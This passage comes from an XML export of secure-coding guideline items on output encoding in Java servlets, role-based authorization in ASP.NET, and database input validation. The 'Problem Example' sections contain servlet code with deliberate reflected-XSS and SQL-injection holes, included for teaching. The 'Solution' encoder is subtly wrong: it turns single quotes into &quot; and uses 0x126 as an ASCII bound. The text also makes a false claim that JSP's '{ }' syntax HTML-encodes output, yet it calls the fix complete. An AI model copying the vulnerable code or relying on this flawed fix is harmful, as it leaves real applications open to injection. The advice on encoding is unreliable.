&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:de1299b9-854b-4479-9f26-bbc9df38af29"&gt;Use SSL or IPSec for Secure Communication Between Entities&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>4880b800-8273-4ef5-b094-efa3d09e6e10</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Encode All Output Data</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;Applications written using Servlets or JSP.&lt;/p&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Encode all input that is displayed back to the user.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Encoding echoed input prevents injection attacks such as cross-site scripting.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If user input will be echoed back to the client in any way, encode it first. This includes input that is immediately echoed back as well as input that is stored first (such as in a database) before being echoed back later.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Encoding the echoed user input prevents injection attacks such as cross-site scripting. Use the following steps to ensure all echoed input is encoded:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all echoed input. &lt;/strong&gt;Locate all places inside your application where user-supplied data will be returned to the client. Such data can be of reflective or persistent nature:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Reflective&lt;/strong&gt;: In a reflective setting, the input is immediately returned to the client. For example, search engines present the searched query when displaying the results.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Persistent&lt;/strong&gt;: In a persistent setting, the input is stored and returned to the client at a different stage in your application. For example, message boards store the users' posts inside a database and return them when a given topic is viewed.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Determine the&amp;nbsp;type of encoding. &lt;/strong&gt;After identifying all echoed input, determine how the input is returned to client. Because input can take the form of HTML content or URLs, your application needs to use different encoding techniques:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;URL encoding&lt;/strong&gt;: URL encoding allows your application to maintain the original URL, yet display it to the user in a non-malicious way. Because HTTP headers allow a substitution schema, all characters/symbols are preserved by displaying their
 ASCII codes instead of the actual character/symbol. For example, &lt;strong&gt;&amp;lt;&lt;/strong&gt; is represented by
&lt;strong&gt;%3C&lt;/strong&gt; where &lt;strong&gt;3C&lt;/strong&gt; is the ASCII value for &lt;strong&gt;&amp;lt;&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String encodedUrl = URLEncoder.encode(url);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;HTML encoding&lt;/strong&gt;: HTML encoding is used when the echoed input is returned as regular text or HTML content. Input should be encoded by substituting certain characters with their respective HTML values:&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Character&lt;/td&gt;
&lt;td&gt;HTML value&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt;&lt;/td&gt;
&lt;td&gt;&amp;amp;lt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;gt;&lt;/td&gt;
&lt;td&gt;&amp;amp;gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;amp;&lt;/td&gt;
&lt;td&gt;&amp;amp;amp;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;quot;&lt;/td&gt;
&lt;td&gt;&amp;amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;p&gt;JSP can also HTML encode a string through the use of &lt;strong&gt;{ }&lt;/strong&gt; around the variable.
&lt;strong&gt;{ }&lt;/strong&gt; invoke JSP's built-in HTML encoder which takes the variable between the brackets as its input. Example:
&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;%= {output} %&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Apply the encoding. &lt;/strong&gt;After identifying the echoed input and determining the appropriate encoding method, apply the encoding before the input is returned to the client.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Because it does not HTML encode the echoed input, the application is vulnerable to reflective cross-site scripting.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet&lt;br&gt;             (&lt;br&gt;            HttpServletRequest request,&lt;br&gt;             HttpServletResponse response&lt;br&gt;            )&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  if (validateSearchTerm(searchTerm))&lt;br&gt;                  {&lt;br&gt;                        String retString;&lt;br&gt;                         retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                         // The application does not HTML encode&lt;br&gt;                         //     the returned input&lt;br&gt;                        retString &amp;#43;= searchTerm;&lt;br&gt;                         retString &amp;#43;= &amp;quot;\&amp;quot; results in:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                        out.println(retString);&lt;br&gt;                        common.aggregateData(out, searchTerm);&lt;br&gt;                  }&lt;br&gt;                  else&lt;br&gt;                  {&lt;br&gt;                        // Add appropriate logging and exception handling&lt;br&gt;                         // mechanisms. Consult the Exception Handling and&lt;br&gt;                         // Logging sections&lt;br&gt;                         out.println(&amp;quot;Unable to process at the moment.&amp;quot;&lt;br&gt;                                 &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;             catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling&lt;br&gt;                   // mechanisms. Consult the Exception Handling&lt;br&gt;                   // and Logging sections&lt;br&gt;                   out.println(&amp;quot;Unable to process at the moment.&amp;quot;&lt;br&gt;                           &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;            out.close();&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Because the code HTML encodes the echoed input, it is impossible for an attacker to exploit the application via reflective cross-site scripting.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet&lt;br&gt;      (&lt;br&gt;        HttpServletRequest request,&lt;br&gt;         HttpServletResponse response&lt;br&gt;      )&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  if (validateSearchTerm(searchTerm))&lt;br&gt;                  {&lt;br&gt;                        String retString;&lt;br&gt;                         retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                         // The application HTML encodes the echoed input&lt;br&gt;                        retString &amp;#43;= encodeHtml(searchTerm);&lt;br&gt;                         retString &amp;#43;= &amp;quot;\&amp;quot; results in :&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                        out.println(retString);&lt;br&gt;                        common.aggregateData(out, searchTerm);&lt;br&gt;                  }&lt;br&gt;                  else&lt;br&gt;                  {&lt;br&gt;                        // Add the appropriate logging and exception&lt;br&gt;                         // handling mechanisms. Consult the Exception&lt;br&gt;                         // Handling and Logging sections&lt;br&gt;                         out.println(&amp;quot;Unable to process at the moment.&amp;quot;&lt;br&gt;                                 &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;            catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception&lt;br&gt;                   // handling mechanisms. Consult the Exception&lt;br&gt;                   // Handling and Logging sections&lt;br&gt;                   out.println(&amp;quot;Unable to process at the moment.&amp;quot;&lt;br&gt;                           &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;            }             out.flush();&lt;br&gt;            out.close();&lt;br&gt;      }&lt;br&gt;       public String encodeHtml(String input)&lt;br&gt;      {&lt;br&gt;            StringBuffer out = new StringBuffer();&lt;br&gt;             for (int i = 0; i &amp;lt; input.length(); i&amp;#43;&amp;#43;)&lt;br&gt;            {&lt;br&gt;                  char c = input.charAt(i);&lt;br&gt;                  if (c == '&amp;lt;')&lt;br&gt;                  {&lt;br&gt;                        out.append(&amp;quot;&amp;amp;lt;&amp;quot;);&lt;br&gt;                  }&lt;br&gt;                  else if (c == '&amp;gt;')&lt;br&gt;                  {&lt;br&gt;                        out.append(&amp;quot;&amp;amp;gt;&amp;quot;);&lt;br&gt;                  }&lt;br&gt;                  else if (c == '\&amp;quot;')&lt;br&gt;                  {&lt;br&gt;                        out.append(&amp;quot;&amp;amp;quot;&amp;quot;);&lt;br&gt;                  }&lt;br&gt;                  else if (c == '\'')&lt;br&gt;                  {&lt;br&gt;                        out.append(&amp;quot;&amp;amp;quot;&amp;quot;);&lt;br&gt;                  }&lt;br&gt;                  else if (c == '&amp;amp;')&lt;br&gt;                  {&lt;br&gt;                        out.append(&amp;quot;&amp;amp;amp;&amp;quot;);&lt;br&gt;                  }&lt;br&gt;                  else if (c &amp;gt; 0x20 &amp;amp;&amp;amp; c &amp;lt; 0x126)&lt;br&gt;                  {&lt;br&gt;                        out.append(c);&lt;br&gt;                  }&lt;br&gt;                  else&lt;br&gt;                  {&lt;br&gt;                        out.append(&amp;quot;&amp;amp;#&amp;quot; &amp;#43; (int)c &amp;#43; &amp;quot;;&amp;quot;);&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;             return out.toString();&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about preventing cross-site scripting, see: &lt;a href="http://support.microsoft.com/kb/252985"&gt;
How to prevent cross-site scripting security issues&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;Attack: Cross Site Scripting Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:2B17E816-C6C4-4B05-BE92-01DC71073F66"&gt;Attack: Response Splitting Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36"&gt;Attack: AJAX Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D4DBB48C-D394-4632-B72F-148BCD87E9D9"&gt;Checklist Item: All Output Data is Encoded (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>500a3e89-2937-41b8-99cc-a19dc7696ed6</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Perform Role-based Security Checks</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authorization</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Enumerate the different types of users and create specific roles for them. When authorizing access to a resource, build the security checks on a per-role basis rather than on a per-user basis.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Application roles allow administrators to group users into categories that need the same level of privileges. The mechanism provides an easy and clear way to discover and manage the least privileges necessary for the execution of a given task. It provides
 a more robust and flexible way of managing the application's users.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application uses access control and authorizes its users to application resources.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To apply this concept access control should be based on a user's role rather than the actual user.&lt;/p&gt;
&lt;p&gt;Use the following steps when designing the role-based security:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Understand the different types of users&lt;/strong&gt;: Enumerate the different types of users needed for the application. Understand how they willl use the application and to which resources they will need access. Create a matrix mapping the actions each
 role is authorized to perform with the corresponding system components. Use this matrix to identify the different types of users according to the functionality they need. Creating a threat model may be a useful step to ensure that you correctly understand
 the implications of this matrix.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Establish the roles&lt;/strong&gt;: Define which resources can be accessed by each role. There are two approaches when enforcing role-based security - programmatic and declarative.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Programmatically&lt;/strong&gt;: The programmatic approach to role-based security is written inside the code and provides additional runtime flexibility. It allows your application to dynamically create and assign roles so that user privileges can be granted
 and revoked without the need of restarting your application. When using the programmatic approach to role-based security, place access control checks at the appropriate locations in your application. For example, the following code requires users to be shareholders
 in order to generate a financial report:&lt;/p&gt;
&lt;pre&gt;public void GenerateFinancialReport(DateTime startDate, DateTime endDate)&lt;br&gt;{&lt;br&gt;    if (HttpContext.Current.User.IsInRole(&amp;quot;ShareHolders&amp;quot;))&lt;br&gt;    {&lt;br&gt;        // Generate the relevant financial report&lt;br&gt;    }&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;Additionally, your application can programmatically check if a user is member of a local Windows group.&lt;/p&gt;
&lt;pre&gt;public void RetrieveLogs(ref Hashtable logTable)&lt;br&gt;{&lt;br&gt;    WindowsPrincipal user = new WindowsPrincipal((WindowsIdentity)HttpContext.Current.User.Identity);&lt;br&gt;    if (user.IsInRole(WindowsBuiltInRole.Administrator))&lt;br&gt;    {&lt;br&gt;        // Add logic for retrieving logs&lt;br&gt;    }&lt;br&gt;}&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Declarative&lt;/strong&gt;: The declarative approach to role-based security is done via the configuration files. It allows easy manageability as the declarations can be modified without having to recompile. By using the declarative approach, you can easily
 manage the security settings for large portions of the application without changing the source code. ASP.NET applications that use declarative security specify the appropriate roles inside
&lt;strong&gt;web.config&lt;/strong&gt;. The following elements enforce role-based security through
&lt;strong&gt;web.config&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;roleManager&lt;/strong&gt;: Configures the ASP.NET role manager. Applicable only if form-based authentication is used. Example:&lt;/p&gt;
&lt;pre&gt;&amp;lt;connectionStrings&amp;gt;&lt;br&gt;  &amp;lt;add name=&amp;quot;MyAppSqlConnection&amp;quot;&lt;br&gt;       connectionString=&amp;quot;Server=serv02.example.com; Database=myapp; Integrated Security=SSPI;&amp;quot;&lt;br&gt;       providerName=&amp;quot;System.Data.SqlClient&amp;quot;/&amp;gt;&lt;br&gt; ...&lt;br&gt; &amp;lt;system.web&amp;gt;&lt;br&gt;   &amp;lt;roleManager enabled=&amp;quot;true&amp;quot; cacheRolesInCookie=&amp;quot;false&amp;quot; defaultProvider =&amp;quot;ProjectRoleProvider&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;providers&amp;gt;&lt;br&gt;      &amp;lt;clear /&amp;gt;&lt;br&gt;      &amp;lt;add name=&amp;quot;MyAppRoleProvider&amp;quot;&lt;br&gt;            type=&amp;quot;System.Web.Security.SqlRoleProvider&amp;quot;&lt;br&gt;            connectionStringName=&amp;quot;MyAppSqlConnection&amp;quot;&lt;br&gt;            applicationName=&amp;quot;MyApp&amp;quot;/&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;authorization&lt;/strong&gt;: Encapsulates the authorization settings for a resource.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;allow&lt;/strong&gt;: Represents the users and roles that are allowed access to the given resource.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;deny&lt;/strong&gt;: Represents the users and roles that are denied access to the given resource.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;pre&gt;&amp;lt;!-- web.config --&amp;gt;&lt;br&gt;&amp;lt;system.web&amp;gt;&lt;br&gt;   &amp;lt;authentication mode=&amp;quot;Windows&amp;quot; /&amp;gt;&lt;br&gt;   &amp;lt;authorization&amp;gt;&lt;br&gt;    &amp;lt;allow roles=&amp;quot;BUILTIN\Administrators&amp;quot;/&amp;gt;&lt;br&gt;    &amp;lt;deny users=&amp;quot;*&amp;quot;/&amp;gt;&lt;br&gt;  &amp;lt;/authorization&amp;gt;&lt;br&gt;&amp;lt;/system.web&amp;gt;&lt;/pre&gt;
&lt;p&gt;Additionally, if your application uses form-based authentication, you can configure your application's access controls through Visual Studio's ASP.NET Configuration, available by accessing the
&lt;strong&gt;Website -&amp;gt; ASP.NET Configuration&lt;/strong&gt; menu.&lt;/p&gt;
&lt;p&gt;Note that if you use Windows authentication, you will need to manage your application's users and user roles through managing Windows users and groups.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Manage the users&lt;/strong&gt;: Assign the users into their respective user roles. The application should enforce the security policy according to the user roles instead of the actual user. Based on your application's mechanism to enforce role-based access
 controls, use one of the following techniques to manage your application's users:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Programmatically&lt;/strong&gt;: ASP.NET allows you to manage your application's users through the
&lt;strong&gt;Roles&lt;/strong&gt; class.&lt;/p&gt;
&lt;p&gt;Use the following methods to assign users into roles:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;AddUserToRole&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;AddUserToRoles&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;AddUsersToRole&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;AddUsersToRoles&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Example:&lt;/p&gt;
&lt;pre&gt;Roles.AddUserToRole(&amp;quot;eric&amp;quot;, &amp;quot;ShareHolders&amp;quot;);&lt;/pre&gt;
&lt;p&gt;Use the following methods to remove users from roles:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;RemoveUserFromRole&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;RemoveUserFromRoles&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;RemoveUsersFromRole&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;RemoveUsersFromRoles&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Example:&lt;/p&gt;
&lt;pre&gt;Roles.RemoveUserFromRole(&amp;quot;eric&amp;quot;, &amp;quot;ShareHolders&amp;quot;);&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Declarative&lt;/strong&gt;: Use the ASP.NET Role Manager to manage your application's users. If your application uses form-based authentication, you can configure your application's access controls through Visual Studio's ASP.NET Configuration, available
 by accessing the &lt;strong&gt;Website -&amp;gt; ASP.NET Configuration&lt;/strong&gt; menu.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Windows&lt;/strong&gt;: If your application uses Windows authentication, use the Windows
&lt;strong&gt;Local Users and Groups&lt;/strong&gt; service to manage your application's users. If your server is connected to your organization's NT Domain or Active Directory forest, user and role management will be performed by your organization's network administrators.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following segment illustrates an application's access control policy. Because the application does not enforce role-based security, it has a policy entry for each separate user; therefore managing the users' access rights can be quite difficult when
 the number of users to the application grows.&lt;/p&gt;
&lt;pre&gt;&amp;lt;authorization&amp;gt;&lt;br&gt;  &amp;lt;allow users=&amp;quot;NTDomain\joe, NTDomain\sarah, NTDomain\bill, NTDomain\sue&amp;quot;/&amp;gt;&lt;br&gt;  &amp;lt;deny users=&amp;quot;*&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/authorization&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following segment illustrates an application's access control policy. Because the application enforces role-based security, it provides a policy entry for each group of users; therefore increasing the application's users store has no impact on the ability
 to manage the users' access rights as only the group permissions need to be modified.&lt;/p&gt;
&lt;pre&gt;&amp;lt;authorization&amp;gt;&lt;br&gt;  &amp;lt;allow roles=&amp;quot;NTDomain\Employees&amp;quot;/&amp;gt;&lt;br&gt;  &amp;lt;deny users=&amp;quot;*&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/authorization&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about the roleManager element in web.config, visit: Documentation for
&lt;a href="http://msdn2.microsoft.com/en-us/library/ms164660(vs.80).aspx"&gt;roleManager Element&lt;/a&gt; in MSDN.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:610BAA36-8A3C-404D-81D8-403ED054FEC4"&gt;Guideline: Partition Application Between Public and Private Domains
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3E8C3E82-D02C-4322-87F6-0D2F0FA55DD2"&gt;Guideline: Partition Application Between Public and Private Domains&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:14FBF85D-0E97-4CD1-A0EE-D5AA791FA45C"&gt;Guideline: Define a Security Policy
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:FC9AF70F-092C-4AC6-9B54-6793DE17B8DD"&gt;Attack: Business Rule Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:AE79E2C4-186C-47E4-8D05-3C6ECAB2E1AF"&gt;Checklist Item: Role-Based Security Checks are Performed
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>518f71dd-7173-4801-8a48-c0108b294809</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Validate All Input Passed to Database</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP&amp;nbsp;that interact with a database.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Validate all input before it is passed to the database.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Unvalidated input can lead to persistent cross-site scripting, SQL injection and other vulnerabilities which would allow an attacker to gain unauthorized access to sensitive data.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application uses a backend database server, then validate all input before it is passed to the database.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To properly validate input passed to database:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Identify database entry points. &lt;/strong&gt;Identify all locations within your application that interface with the database servers. Potential sources of input include:
&lt;ul&gt;
&lt;li&gt;URL-based parameters &lt;/li&gt;&lt;li&gt;Form-based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;Local filesystem &lt;/li&gt;&lt;li&gt;Javascript variables&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create a set of validators.&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Build a set of validators that work with the database-specific language. Using the
&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Validate Input for Length, Range, Format, and Type&lt;/a&gt; guideline, determine the appropriate validation at each validator.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Centralize the validators as it helps strengthen your code by limiting the amount of scattered validation code throughout the component.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Place the validators along the database entry points. All data should pass through the validators before transmitted to the database servers.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use type safe SQL parameters in queries. &lt;/strong&gt;Stored procedures and parameterized queries improve your application's robustness against SQL injection based attacks. Consult the
&lt;a href="?#ruledisplay:9DF701E2-7929-4533-9DC3-368AAC4E553D"&gt;Use Type Safe SQL Parameters When Constructing SQL Queries&lt;/a&gt; and
&lt;a href="?#ruledisplay:ADE80907-B490-4FD3-81A8-826117E25662"&gt;Use Stored Procedures&lt;/a&gt; guidelines for more details.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code allows the user to query a database. Unfortunately, the application fails to validate the user's input; therefore, an attacker can access the backend database on behalf of the application through the use of SQL injection.
&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public void doGet(HttpServletRequest request,&lt;br&gt;     HttpServletResponse response) throws ServletException, IOException{&lt;br&gt;     PrintWriter out = response.getWriter();&lt;br&gt;     String query = request.getParameter(&amp;quot;query&amp;quot;);&lt;br&gt;     String retData = &amp;quot;&amp;quot;;&lt;br&gt; &lt;br&gt;     // The application fails to validate the user-supplied&lt;br&gt;     // query before submitting it to the database server&lt;br&gt;     retData = queryDB(query);&lt;br&gt; &lt;br&gt;     ...&lt;br&gt; &lt;br&gt;     out.flush();&lt;br&gt;     out.close();&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code allows the user to query a database. Because the application validates the user's input, it is much more difficult for an attacker to access the backend database through a SQL injection attack.&lt;/p&gt;
&lt;blockquote&gt;
